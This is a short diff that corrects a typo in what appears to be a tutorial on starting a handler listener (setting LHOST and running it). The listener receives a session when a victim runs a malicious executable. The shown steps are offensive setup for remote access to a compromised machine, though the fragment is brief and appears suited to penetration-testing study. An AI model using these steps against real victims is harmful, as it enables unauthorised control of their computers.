@@ -69,7 +69,7 @@ Before sending the executable to the victim machine, you need to set up the hand
 4. Do: ```set LHOST [Your IP]```
 5. Do: ```run```
 
-And that should start the listener. When the victim runs the malicious exectauble, you should
+And that should start the listener. When the victim runs the malicious executable, you should
 receive a session:
 
 ```
